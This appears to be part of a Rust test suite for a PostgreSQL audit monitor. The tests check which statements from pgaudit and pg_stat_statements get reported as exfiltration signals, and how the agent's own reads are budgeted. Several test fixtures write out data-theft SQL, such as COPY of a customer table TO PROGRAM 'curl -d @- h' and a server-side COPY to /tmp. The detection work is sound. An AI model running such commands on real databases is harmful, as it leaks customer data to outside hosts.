            all[4].starts_with("Write") && all[4].contains("crm.notes"),
            "{}",
            all[4]
        );
    }

    #[test]
    fn own_account_is_reported_unless_routine() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            // The agent's Discovery sample: skipped.
            rec(
                "a1",
                1,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
                Some(1000),
                "databastion-agent",
            ),
            // Same account, whole-table read: reported even under the agent's name.
            rec(
                "a1",
                2,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "select * from crm.t",
                Some(5),
                "databastion-agent",
            ),
            // Same account from another application: reported.
            rec(
                "a2",
                1,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "select a from crm.t where id = 1",
                Some(1),
                "stolen",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 2, "{all:?}");
        assert!(all[0].contains("shape.full_table_read"), "{all:?}");
        assert_eq!(events[1].principal().application(), Some("stolen"));
        // pg_stat_statements: the agent's account only with a signal.
        let routine = analyze_pss("SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1", false);
        let dump = analyze_pss("select * from crm.t", false);
        let deltas = [
            StatementDelta {
                user: "databastion",
                database: "shop",
                analysis: &routine,
                calls: 1,
                rows: 1000,
            },
            StatementDelta {
                user: "databastion",
                database: "shop",
                analysis: &dump,
                calls: 1,
                rows: 5,
            },
        ];
        let t0 = SystemTime::UNIX_EPOCH;
        let ev = pss_events(&deltas, &mut own(), t0, t0);
        assert_eq!(ev.len(), 1);
        assert!(ev[0].signals().contains(&Signal::FullTableRead));
    }

    #[test]
    fn own_account_paging_and_other_addresses_are_reported() {
        let page = |i: u64| {
            rec(
                "p1",
                i,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
                Some(600),
                "databastion-agent",
            )
        };
        let mut b = PgauditEvents::new(own());
        // 600 rows: within Discovery's budget (1000); 1200: beyond.
        assert!(b.convert(vec![page(1)], SystemTime::now()).is_empty());
        assert_eq!(b.convert(vec![page(2)], SystemTime::now()).len(), 1);
        // Another client address than the agent's.
        let mut b = PgauditEvents::new(OwnAccount::new(
            "databastion",
            ClientAddr::parse("198.51.100.7"),
            1000,
            SharedOwnUsage::default(),
        ));
        assert_eq!(b.convert(vec![page(1)], SystemTime::now()).len(), 1);
        // The agent's address could not be read: nothing is left out.
        let mut b = PgauditEvents::new(OwnAccount::new(
            "databastion",
            None,
            1000,
            SharedOwnUsage::default(),
        ));
        assert_eq!(b.convert(vec![page(1)], SystemTime::now()).len(), 1);
        // Unknown rows (pgaudit.log_rows off) are charged the whole budget:
        // the second statement on the same object is reported.
        let unknown = |i: u64| {
            rec(
                "p2",
                i,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
                None,
                "databastion-agent",
            )
        };
        let mut b = PgauditEvents::new(own());
        assert!(b.convert(vec![unknown(1)], SystemTime::now()).is_empty());
        assert_eq!(b.convert(vec![unknown(2)], SystemTime::now()).len(), 1);
        // pg_stat_statements: rows per object within the poll.
        let routine = analyze_pss("SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1", false);
        let deltas = [StatementDelta {
            user: "databastion",
            database: "shop",
            analysis: &routine,
            calls: 3,
            rows: 3000,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        assert_eq!(pss_events(&deltas, &mut own(), t0, t0).len(), 1);
    }

    #[test]
    fn own_budget_survives_stream_restarts_and_source_switches() {
        let shared = SharedOwnUsage::default();
        let own_on = |u: &SharedOwnUsage| {
            OwnAccount::new(
                "databastion",
                ClientAddr::parse("192.0.2.14"),
                1000,
                std::sync::Arc::clone(u),
            )
        };
        let page = rec(
            "r1",
            1,
            1,
            "READ",
            "SELECT",
            "crm.t",
            "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
            Some(600),
            "databastion-agent",
        );
        // First pgaudit stream: within the budget.
        let mut b = PgauditEvents::new(own_on(&shared));
        assert!(b.convert(vec![page], SystemTime::now()).is_empty());
        drop(b);
        // The stream restarts on pg_stat_statements (source switch): the
        // same object is still charged, and the next read is reported.
        let routine = analyze_pss("SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1", false);
        let deltas = [StatementDelta {
            user: "databastion",
            database: "shop",
            analysis: &routine,
            calls: 1,
            rows: 600,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        assert_eq!(pss_events(&deltas, &mut own_on(&shared), t0, t0).len(), 1);
        // A fresh usage (what a per-stream counter did) would have skipped it.
        assert!(pss_events(&deltas, &mut own_on(&SharedOwnUsage::default()), t0, t0).is_empty());
    }

    #[test]
    fn own_budget_spans_a_day_not_a_window() {
        let mut o = own();
        let t0 = Instant::now();
        let key = || "shop\u{0}crm\u{0}t".to_owned();
        assert!(!o.charge(key(), 600, t0));
        // An hour later (past any aggregation window): still counted.
        assert!(o.charge(key(), 600, t0 + std::time::Duration::from_secs(3600)));
        // A day later: the first charges have aged out.
        let mut o = own();
        assert!(!o.charge(key(), 600, t0));
        assert!(!o.charge(key(), 600, t0 + std::time::Duration::from_secs(25 * 3600)));
    }

    /// The per-transaction statements of one Discovery scan (about 90
    /// transactions) and the check / stream probes, as the agent sends
    /// them.
    fn own_tableless_records(app: &str, n: u64) -> Vec<AuditRecord> {
        let mut out = vec![rec(
            "own1",
            1,
            1,
            "READ",
            "SELECT",
            "",
            sql::SESSION_SETUP,
            Some(1),
            app,
        )];
        for i in 0..n {
            out.push(rec(
                "own1",
                2 + i,
                1,
                "READ",
                "SELECT",
                "",
                sql::SET_LOCAL_TIMEOUTS,
                Some(1),
                app,
            ));
        }
        out.push(rec(
            "own1",
            2 + n,
            1,
            "READ",
            "SELECT",
            "",
            sql::OWN_CLIENT_ADDR,
            Some(1),
            app,
        ));
        out
    }

    fn charged_keys(u: &SharedOwnUsage) -> Vec<String> {
        u.lock().unwrap().usage.keys().cloned().collect()
    }

    #[test]
    fn own_tableless_statements_are_skipped_and_not_charged() {
        let usage = SharedOwnUsage::default();
        // A small budget: one charge of the old rule would exceed it.
        let acct = OwnAccount::new(
            "databastion",
            ClientAddr::parse("192.0.2.14"),
            10,
            std::sync::Arc::clone(&usage),
        );
        let mut b = PgauditEvents::new(acct);
        // pgaudit.log_rows off: unknown rows, charged the whole budget
        // under the row rule.
        let mut recs = own_tableless_records("databastion-agent", 5);
        for r in &mut recs {
            r.audit.rows = None;
        }
        recs.extend(own_tableless_records("databastion-agent", 5));
        let events = b.convert(recs, SystemTime::now());
        assert!(
            events.is_empty(),
            "{:?}",
            events.iter().map(json).collect::<Vec<_>>()
        );
        assert!(
            charged_keys(&usage).is_empty(),
            "{:?}",
            charged_keys(&usage)
        );
        // The same statements from the agent's account under another
        // application, and from another role: reported against `*`.
        for app in ["stolen", "psql"] {
            let mut b = PgauditEvents::new(own());
            let events = b.convert(own_tableless_records(app, 2), SystemTime::now());
            assert_eq!(events.len(), 4, "{app}");
            assert!(events.iter().all(|e| json(e).contains("shop..*")), "{app}");
        }
        // The agent's application and account from another address.
        let mut b = PgauditEvents::new(OwnAccount::new(
            "databastion",
            ClientAddr::parse("198.51.100.7"),
            1000,
            SharedOwnUsage::default(),
        ));
        let events = b.convert(
            own_tableless_records("databastion-agent", 1),
            SystemTime::now(),
        );
        assert_eq!(events.len(), 3);
    }

    #[test]
    fn own_account_other_tableless_statements_are_reported() {
        let usage = SharedOwnUsage::default();
        let mut b = PgauditEvents::new(OwnAccount::new(
            "databastion",
            ClientAddr::parse("192.0.2.14"),
            1000,
            std::sync::Arc::clone(&usage),
        ));
        let texts = [
            // A user-defined function: the connector never calls one.
            "select crm.f()",
            "SELECT crm.f($1)",
            // pg_catalog functions that read relations or run SQL.
            "SELECT pg_catalog.query_to_xml($1, true, false, '')",
            "select pg_catalog.lo_get(16400)",
            // An own statement with something appended or changed.
            &format!("{} , crm.f()", sql::OWN_CLIENT_ADDR),
            "SELECT pg_catalog.set_config('statement_timeout', $1, true)",
            &sql::SET_LOCAL_TIMEOUTS.to_lowercase(),
            // Several statements.
            &format!("{}; select crm.f()", sql::OWN_CLIENT_ADDR),
        ];
        for (i, t) in texts.iter().enumerate() {
            let r = rec(
                "f1",
                i as u64 + 1,
                1,
                "READ",
                "SELECT",
                "",
                t,
                Some(1),
                "databastion-agent",
            );
            let events = b.convert(vec![r], SystemTime::now());
            assert_eq!(events.len(), 1, "{t}");
            assert!(json(&events[0]).contains("shop..*"), "{t}");
        }
        assert!(charged_keys(&usage).is_empty(), "`*` is never budgeted");
        // One record of the statement is an own text, another is not: the
        // event is not an own statement.
        let recs = vec![
            rec(
                "f2",
                1,
                1,
                "READ",
                "SELECT",
                "",
                sql::OWN_CLIENT_ADDR,
                Some(1),
                "databastion-agent",
            ),
            rec(
                "f2",
                1,
                2,
                "READ",
                "SELECT",
                "",
                "select crm.f()",
                Some(1),
                "databastion-agent",
            ),
        ];
        assert_eq!(b.convert(recs, SystemTime::now()).len(), 1);
    }

    #[test]
    fn own_reads_of_a_masked_name_stay_budgeted() {
        // A value-like relation name normalizes to `*`: still a named
        // relation, budgeted like any other (not the unknown object).
        let text = "SELECT \"a\" FROM ONLY \"crm\".\"export_client_0639988384\" LIMIT $1";
        let r = rec(
            "v1",
            1,
            1,
            "READ",
            "SELECT",
            "crm.export_client_0639988384",
            text,
            Some(10),
            "databastion-agent",
        );
        let mut b = PgauditEvents::new(own());
        assert!(b.convert(vec![r], SystemTime::now()).is_empty());
        let a = analyze_pss(text, false);
        let deltas = [StatementDelta {
            user: "databastion",
            database: "shop",
            analysis: &a,
            calls: 1,
            rows: 10,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        assert!(pss_events(&deltas, &mut own(), t0, t0).is_empty());
    }

    #[test]
    fn own_tableless_statements_with_a_signal_are_reported() {
        let mut b = PgauditEvents::new(own());
        let r = rec(
            "g1",
            1,
            1,
            "READ",
            "SELECT",
            "",
            sql::SET_LOCAL_TIMEOUTS,
            Some(LARGE_ROWS + 1),
            "databastion-agent",
        );
        let events = b.convert(vec![r], SystemTime::now());
        assert_eq!(events.len(), 1);
        assert!(events[0].signals().contains(&Signal::LargeResult));
        // pg_stat_statements: rows summed over the poll.
        let a = analyze_pss(
            "SELECT pg_catalog.set_config($4, $1, $5), pg_catalog.set_config($6, $2, $7), \
             pg_catalog.set_config($8, $3, $9), pg_catalog.current_setting($10)",
            false,
        );
        let deltas = [StatementDelta {
            user: "databastion",
            database: "shop",
            analysis: &a,
            calls: LARGE_ROWS + 1,
            rows: LARGE_ROWS + 1,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        let ev = pss_events(&deltas, &mut own(), t0, t0);
        assert_eq!(ev.len(), 1);
        assert!(ev[0].signals().contains(&Signal::LargeResult));
    }

    #[test]
    fn own_tableless_statements_in_pg_stat_statements() {
        // Texts as pg_stat_statements stores them (constants, booleans
        // included, replaced by parameters; checked on PostgreSQL 16).
        let set_local = analyze_pss(
            "SELECT pg_catalog.set_config($4, $1, $5), pg_catalog.set_config($6, $2, $7), \
             pg_catalog.set_config($8, $3, $9), pg_catalog.current_setting($10)",
            false,
        );
        let setup = analyze_pss(
            &sql::SESSION_SETUP
                .replace("'search_path'", "$4")
                .replace("''", "$5")
                .replace("false", "$6"),
            false,
        );
        let addr = analyze_pss(sql::OWN_CLIENT_ADDR, false);
        let texts_sql = sql::pss_texts("public", true).unwrap();
        let texts = analyze_pss(
            &texts_sql
                .replace("pg_stat_statements(true)", "pg_stat_statements($2)")
                .replace("8192", "$3"),
            false,
        );
        let cut = analyze_pss(sql::OWN_CLIENT_ADDR, true);
        let other = analyze_pss("select crm.f($1)", false);
        let delta = |user, analysis| StatementDelta {
            user,
            database: "shop",
            analysis,
            calls: 90,
            rows: 90,
        };
        let own_account = own;
        let usage = SharedOwnUsage::default();
        let mut own = OwnAccount::new(
            "databastion",
            ClientAddr::parse("192.0.2.14"),
            10,
            std::sync::Arc::clone(&usage),
        );
        own.allow_statement(&texts_sql);
        let t0 = SystemTime::UNIX_EPOCH;
        // Two polls' worth of a scan: nothing reported, nothing charged.
        for _ in 0..2 {
            let deltas = [
                delta("databastion", &set_local),
                delta("databastion", &setup),
                delta("databastion", &addr),
                delta("databastion", &texts),
            ];
            let ev = pss_events(&deltas, &mut own, t0, t0);
            assert!(
                ev.is_empty(),
                "{:?}",
                ev.iter().map(json).collect::<Vec<_>>()
            );
        }
        assert!(charged_keys(&usage).is_empty());
        // Another role, a cut text, another function: reported on `*`.
        let deltas = [
            delta("app", &set_local),
            delta("app", &texts),
            delta("databastion", &cut),
            delta("databastion", &other),
        ];
        let ev = pss_events(&deltas, &mut own, t0, t0);
        assert_eq!(ev.len(), 4);
        assert!(ev.iter().all(|e| json(e).contains("shop..*")));
        // Without the stream's registration, the text query is not one of
        // the agent's statements.
        let ev = pss_events(&[delta("databastion", &texts)], &mut own_account(), t0, t0);
        assert_eq!(ev.len(), 1);
    }

    #[test]
    fn a_discovery_scan_leaves_no_own_event_and_no_wildcard_charge() {
        // Every statement the connector sends, as pgaudit logs it
        // (`pgaudit.log_rows` on, `log_relation` off), with about 90
        // transactions of `set_config` calls; the sampling statements
        // within the budget. The `pg_stat_statements` text queries were
        // registered by an earlier `pg_stat_statements` stream of the
        // target (source switch: the pgaudit stream reads the records of
        // that period).
        let usage = SharedOwnUsage::default();
        let mut pss = OwnAccount::new(
            "databastion",
            ClientAddr::parse("192.0.2.14"),
            1000,
            std::sync::Arc::clone(&usage),
        );
        pss.allow_statement(&sql::pss_texts("public", true).unwrap());
        pss.allow_statement(&sql::pss_texts("public", false).unwrap());
        drop(pss);
        let mut b = PgauditEvents::new(OwnAccount::new(
            "databastion",
            ClientAddr::parse("192.0.2.14"),
            1000,
            std::sync::Arc::clone(&usage),
        ));
        let mut recs = own_tableless_records("databastion-agent", 90);
        for (i, text) in sql::all_statements().iter().enumerate() {
            // Transaction control is logged in the MISC class.
            let (class, command) = match text.split(' ').next() {
                Some("BEGIN") => ("MISC", "BEGIN"),
                Some("COMMIT") => ("MISC", "COMMIT"),
                Some("ROLLBACK") => ("MISC", "ROLLBACK"),
                _ => ("READ", "SELECT"),
            };
            recs.push(rec(
                "scan",
                i as u64 + 1,
                1,
                class,
                command,
                "",
                text,
                Some(100),
                "databastion-agent",
            ));
        }
        let events = b.convert(recs, SystemTime::now());
        assert!(
            events.is_empty(),
            "{:?}",
            events.iter().map(json).collect::<Vec<_>>()
        );
        let keys = charged_keys(&usage);
        assert!(!keys.iter().any(|k| k.ends_with("\u{0}*")), "{keys:?}");
        // Only the sampled relation (`s.t`) is budgeted.
        assert_eq!(keys, ["shop\u{0}s\u{0}t"], "{keys:?}");
    }

    #[test]
    fn copy_records_not_settled_by_their_text_are_server_side_exports() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "x1",
            1,
            2,
            "READ",
            "COPY",
            "",
            "DO $$ BEGIN EXECUTE format('COPY %I.%I TO %L', 'crm', 'customers', '/tmp/x'); END $$",
            Some(0),
            "psql",
        )];
        let events = b.convert(recs, SystemTime::now());
        assert_eq!(events.len(), 1);
        assert!(
            events[0].signals().contains(&Signal::CopyToFile),
            "{}",
            json(&events[0])
        );
        // A client COPY whose text shows it: no server-side signal.
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "x2",
            1,
            1,
            "READ",
            "COPY",
            "",
            "copy crm.t to stdout",
            Some(0),
            "psql",
        )];
        let events = b.convert(recs, SystemTime::now());
        assert!(!events[0].signals().contains(&Signal::CopyToFile));
    }

    #[test]
    fn named_catalog_relations_are_skipped_not_wildcards() {
        // `pgaudit.log_catalog` / `log_relation` name catalog relations.
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            rec(
                "c1",
                1,
                1,
                "READ",
                "SELECT",
                "public.pg_stat_statements_info",
                "SELECT 1 FROM \"public\".pg_stat_statements_info",
                Some(1),
                "psql",
            ),
            rec(
                "c1",
                2,
                1,
                "READ",
                "SELECT",
                "pg_catalog.pg_class",
                "select relname from pg_class",
                Some(1),
                "psql",
            ),
            // A catalog and a user relation: the user relation only.
            rec(
                "c1",
                3,
                1,
                "READ",
                "SELECT",
                "pg_catalog.pg_class",
                "select * from pg_class, crm.t",
                Some(1),
                "psql",
            ),
            rec(
                "c1",
                3,
                2,
                "READ",
                "SELECT",
                "crm.t",
                "select * from pg_class, crm.t",
                Some(1),
                "psql",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 1, "{all:?}");
        assert!(
            all[0].contains("shop.crm.t") && !all[0].contains("*\""),
            "{all:?}"
        );
    }

    #[test]
    fn misc_classes_are_skipped() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "s5",
            1,
            1,
            "MISC",
            "SET",
            "",
            "set application_name = 'x'",
            None,
            "x",
        )];
        assert!(b.convert(recs, SystemTime::now()).is_empty());
    }

    #[test]
    fn do_blocks_functions_and_procedures_are_reported() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            // DO block, inner COPY logged with the block's text (substatement 2).
            rec(
                "d1",
                1,
                1,
                "FUNCTION",
                "DO",
                "",
                "DO $$ BEGIN COPY crm.customers TO PROGRAM 'curl -d @- h'; END $$",
                None,
                "psql",
            ),
            rec(
                "d1",
                1,
                2,
                "READ",
                "COPY",
                "",
                "DO $$ BEGIN COPY crm.customers TO PROGRAM 'curl -d @- h'; END $$",
                Some(0),
                "psql",
            ),
            // Same, inner COPY logged with its own text (pgaudit 16).
            rec(
                "d2",
                1,
                1,
                "READ",
                "COPY",
                "",
                "copy crm.customers to program 'cat > /dev/null'",
                Some(0),
                "psql",
            ),
            // plpgsql function, log_relation off: no object in the record.
            rec(
                "d3",
                1,
                1,
                "READ",
                "SELECT",
                "",
                "select crm.f_pl()",
                Some(1),
                "psql",
            ),
            // SQL function body logged as its own substatement with object.
            rec(
                "d4",
                1,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "select count(*) from crm.customers",
                Some(1),
                "psql",
            ),
            rec(
                "d4",
                1,
                2,
                "READ",
                "SELECT",
                "",
                "select crm.f_sql()",
                Some(1),
                "psql",
            ),
            // Procedure.
            rec(
                "d5",
                1,
                1,
                "READ",
                "SELECT",
                "",
                "CALL crm.p()",
                None,
                "psql",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 5, "{all:#?}");
        assert!(
            all[0].contains("signature.copy_to_program") && all[0].contains("shop.crm.customers"),
            "{}",
            all[0]
        );
        assert!(all[1].contains("signature.copy_to_program"), "{}", all[1]);
        assert!(
            all[2].contains("shop..*"),
            "unknown object reported as *: {}",
            all[2]
        );
        assert!(
            all[3].contains("shop.crm.customers") && all[3].contains("shop..*"),
            "{}",
            all[3]
        );
        assert!(all[4].contains("shop..*"), "{}", all[4]);
    }

    #[test]
    fn statements_are_matched_by_command_tag() {
        let mut b = PgauditEvents::new(own());
        let text = "select 1; copy crm.customers to program 'x'";
        let recs = vec![
            rec("m1", 5, 1, "READ", "SELECT", "", text, Some(1), "psql"),
            rec("m1", 6, 1, "READ", "COPY", "", text, Some(0), "psql"),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 2, "{all:#?}");
        assert!(
            !all[0].contains("shape.full_table_read") && !all[0].contains("copy_to"),
            "{}",
            all[0]
        );
        assert!(
            all[1].contains("signature.copy_to_program") && all[1].contains("crm.customers"),
            "{}",
            all[1]
        );
    }

    #[test]
    fn value_like_names_are_masked() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "s6",
            1,
            1,
            "READ",
            "SELECT",
            "crm.export_client_0639988384",
            "select * from crm.export_client_0639988384",
            Some(1),
            "x",
        )];
        let events = b.convert(recs, SystemTime::now());
        assert!(!json(&events[0]).contains("0639988384"));
    }

    #[test]
    fn pss_deltas() {
        let copy = analyze_pss("COPY crm.customers (id) TO stdout", false);
        let copy2 = analyze_pss("COPY crm.b (id) TO stdout", false);
        let copy3 = analyze_pss("COPY crm.c (id) TO stdout", false);
        let sel = analyze_pss("select * from crm.customers where id = $1", false);
        let ddl = analyze_pss("alter table crm.customers add column x int", false);
        let deltas = [
            StatementDelta {
                user: "u",
                database: "shop",
                analysis: &copy,
                calls: 1,
                rows: 150,
            },
            StatementDelta {
                user: "u",
                database: "shop",
                analysis: &copy2,
                calls: 1,
                rows: 1,
            },
            StatementDelta {
                user: "u",
                database: "shop",
                analysis: &copy3,
                calls: 1,
                rows: 1,
            },
            StatementDelta {
                user: "v",
                database: "shop",
                analysis: &sel,
                calls: 30,
                rows: 30,
            },
            StatementDelta {
                user: "v",
                database: "shop",
                analysis: &ddl,
                calls: 1,
                rows: 0,
            },
        ];
        let t0 = SystemTime::UNIX_EPOCH;
        let t1 = t0 + std::time::Duration::from_secs(10);
        let events = pss_events(&deltas, &mut own(), t0, t1);
        assert_eq!(events.len(), 5);
        assert!(events[0].signals().contains(&Signal::PgDump));
        assert!(events[0].signals().contains(&Signal::FullTableCopy));
        assert_eq!(events[3].aggregated_count(), 30);
        assert_eq!(events[3].ts_last(), Some(t1));
        assert!(events[3].signals().is_empty());
        assert_eq!(events[4].action(), EventAction::Ddl);
        assert!(
            events
                .iter()
                .all(|e| e.source() == EventSource::PgStatStatements)
        );
        assert!(events.iter().all(|e| e.principal().client().is_none()));
    }

    #[test]
    fn object_names_split() {
        let r = split_object_name("crm.customers").unwrap();
        assert_eq!(
            (r.schema.as_deref(), r.name.as_str()),
            (Some("crm"), "customers")
        );
        let r = split_object_name("\"My.Schema\".\"T\"\"x\"").unwrap();
        assert_eq!(
            (r.schema.as_deref(), r.name.as_str()),
            (Some("My.Schema"), "T\"x")
        );
        assert!(split_object_name("a..b").is_none());
        assert!(split_object_name("\"open").is_none());
    }
}
